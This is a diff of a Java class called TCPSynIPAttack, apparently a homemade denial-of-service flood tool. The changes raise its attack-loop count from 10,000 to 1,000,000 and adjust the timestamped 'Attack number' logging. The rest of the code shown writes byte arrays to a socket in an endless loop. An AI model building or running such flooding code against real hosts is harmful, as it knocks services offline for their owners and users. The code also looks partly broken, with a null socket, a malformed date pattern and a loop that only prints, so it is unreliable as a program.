@@ -64,9 +64,10 @@ class TCPSynIPAttack {
     int tcp_fin = 0;
     int placeholder = 0;
     Socket socket = null;
-    //long currentTime = System.currentTimeSec();
-    DateTimeFormatter dtf = DateTimeFormatter.ofPattern("yyyy/MM/dd HH:mm::ss");
+    DateTimeFormatter dtf = DateTimeFormatter.ofPattern("MM/dd/yyy");
     LocalDateTime now = LocalDateTime.now();
+    //long currentTime = System.currentTimeSec();
+    
     
 
     byte[] source_ipBytes = source_ip.getBytes();
@@ -148,14 +149,15 @@ class TCPSynIPAttack {
 	//after completeing the IP flood, now this is going to complete the TCP flood
 
 	while (true) { 
+
 		
 		try (DataOutputStream outToServer = new DataOutputStream(socket.getOutputStream()))
 		{ 
 			while (et != false) {
 			outToServer.write(arr, 0, size);
 			outToServer.write(newArr, 0, thisSize);
-			while (count != 10000) {
-			System.out.println("Attack number:" + count + "\nIP:" + count + " \nTCP:" + count + "\nTime of Attack:" + (dtf.format(now)));
+			while (count != 1000000) {
+			System.out.println("Attack number:" + count + "\nIP:" + count + " \nTCP:" + count + "\nTime of Attack:" + dtf.format(now) + " "+ java.time.LocalTime.now());
 			//System.out.println("TCP sent attack number: " + newArr);
 
 			++ count;
